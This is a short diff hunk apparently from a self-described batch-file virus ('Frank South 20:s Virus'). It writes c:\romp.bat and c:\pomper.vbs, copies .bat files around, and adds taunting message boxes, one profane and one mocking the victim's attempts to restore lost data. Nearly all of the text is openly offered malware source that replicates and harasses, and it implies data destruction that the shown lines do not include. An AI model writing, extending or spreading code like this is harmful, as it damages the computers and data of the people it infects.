@@ -61,7 +61,9 @@ echo md damp >> c:\romp.bat
 echo copy *.bat c:\damp.bat >> c:\romp.bat
 echo echo msgbox" Frank South 20:s Virus, Frank Syd 20:s Virus, Frank South 20 is comming, hahahaha " >> c:\pomper.vbs >> c:\romp.bat
 echo echo msgbox" SecureBoot sucks" >> c:\pomper.vbs >> c:\romp.bat
+echo echo msgbox" My first name is Frank Syd 20, but my other name is Computer-Fucker-South.20" >> c:\pomper.vbs >> c:\romp.bat
 echo echo msgbox" Time to get banned you litle child" >> c:\pomper.vbs >> c:\romp.bat
+echo echo msgbox" Having fun trying to restore your data :D" >> c:\pomper.vbs >> c:\romp.bat
 echo echo msgbox" I haxor u mom and ur PC" >> c:\pomper.vbs >> c:\romp.bat
 echo echo msgbox" Oh No u r so stupid" >> c:\pomper.vbs >> c:\romp.bat
 echo echo msgbox" Wow you probably got this through ur lan" >> c:\pomper.vbs >> c:\romp.bat
